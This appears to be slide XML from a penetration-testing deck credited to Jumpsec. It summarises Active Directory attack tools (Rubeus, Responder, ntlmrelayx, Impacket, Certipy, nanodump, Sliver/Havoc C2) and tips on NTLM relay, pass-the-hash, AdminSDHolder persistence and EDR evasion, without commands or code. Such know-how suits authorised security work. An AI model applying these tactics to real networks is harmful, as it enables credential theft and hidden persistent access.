        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="2328977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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="2354580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Kerberos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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="2354580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Rubeus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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4270248" y="2354580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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="2354580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Kerberoast, PTT, OPtH, S4U, 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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="2516429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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="2523744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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="2542032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NTLM Relay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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="2542032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Responder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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4270248" y="2542032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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="2542032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LLMNR/NBT-NS poisoning, capture hashes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182880" y="2703881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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="2729484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NTLM Relay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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="2729484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ntlmrelayx.py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4270248" y="2729484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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="2729484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Relay NTLM → SMB/LDAP/ADCS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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="2891333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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="2898648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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="2916936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Coercion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2103120" y="2916936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Coercer / PetitPotam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4270248" y="2916936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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="2916936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Force machine auth → relay or capture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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="3078785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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="3104388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Lateral Movement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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="3104388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NetExec (nxc)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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4270248" y="3104388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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="3104388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Spray, exec, dump — mass coverage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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="3266237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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="3273552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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="3291840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Lateral Movement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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="3291840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Impacket suite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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4270248" y="3291840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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="3291840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PTH exec, DCSync, relay, ticketing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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="3453689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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="3479292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Credential Dump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2103120" y="3479292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secretsdump.py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4270248" y="3479292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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="3479292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Remote DCSync / SAM / NTDS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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="3641141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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="3648456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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="3666744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Credential Dump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2103120" y="3666744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nanodump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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4270248" y="3666744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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="3666744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LSASS dump — indirect, EDR-evasive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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="3828593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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="3854196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Priv Esc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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="3854196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pywhisker / Whisker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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4270248" y="3854196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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="3854196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Shadow Credentials (msDS-KeyCredLink)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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="4016045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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="4023360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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="4041648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Priv Esc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2103120" y="4041648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LAPSToolkit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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4270248" y="4041648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5522976" y="4041648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LAPS password read and delegation enum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182880" y="4203497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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="4229100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Priv Esc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2103120" y="4229100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gMSADumper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4270248" y="4229100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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="4229100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Extract gMSA password blobs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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="4390949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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="4398264"/>
            <a:ext cx="8778240" cy="18745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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="4416552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ADCS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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2103120" y="4416552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Certipy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4270248" y="4416552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5522976" y="4416552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ESC1-8 enum + exploitation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182880" y="4578401"/>
            <a:ext cx="8778240" cy="7315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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="256032" y="4604004"/>
            <a:ext cx="17556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2103120" y="4604004"/>
            <a:ext cx="20756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Sliver / Havoc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4270248" y="4604004"/>
            <a:ext cx="1161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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5522976" y="4604004"/>
            <a:ext cx="34015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Open-source C2 for persistent access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5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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="914400"/>
            <a:ext cx="54864" cy="38404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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="347472" y="914400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Enumerate before everything else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47472" y="1133856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BloodHound + PowerView before you touch anything. Know every path before you walk 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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="1453896"/>
            <a:ext cx="54864" cy="384048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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="347472" y="145389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Look for passwords before complex attacks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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="347472" y="167335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GPP, descriptions, shares, KeePass — often faster than cracking or delegation abuse.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182880" y="1993392"/>
            <a:ext cx="54864" cy="384048"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FF6B8A"/>
          </a:solidFill>
          <a:ln cap="flat" cmpd="sng" w="127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"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="347472" y="1993392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F6B8A"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:ea typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
                <a:sym typeface="Consolas"/>
              </a:rPr>
              <a:t>Relay is often easier than cracking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347472" y="2212848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NTLM relay + coercion can hand you DA without cracking a single hash. Check SMB signing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/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="2532888"/>
            <a:ext cx="54864" cy="38404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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="347472" y="2532888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You rarely need the plaintext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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="347472" y="2752344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PTH, PTT, OPtH, Shadow Creds — the hash is almost always enough. Save cracking for when you're stuck.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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="3072384"/>
            <a:ext cx="54864" cy="38404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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="347472" y="3072384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ADCS and gMSA are overlooked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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="347472" y="3291840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ESC1/ESC8 and gMSA abuse yield DA-level access on a shocking number of real environments.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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="3611880"/>
            <a:ext cx="54864" cy="38404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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="347472" y="3611880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AdminSDHolder = persistent access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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="347472" y="3831336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single ACE on AdminSDHolder gives you GenericAll on every protected group — plant it before you clean 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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="182880" y="4151376"/>
            <a:ext cx="54864" cy="384048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347472" y="415137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Use a C2 with BOFs on real engagements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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="347472" y="4370832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Fork-and-run is dead. Inline BOFs + sleep masking + PPID spoofing keep you in without burning the beacon.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2026-03-25T01:04:08Z</dcterms:created>
  <dc:creator>Jumpsec</dc:creator>
</cp:coreProperties>
</file>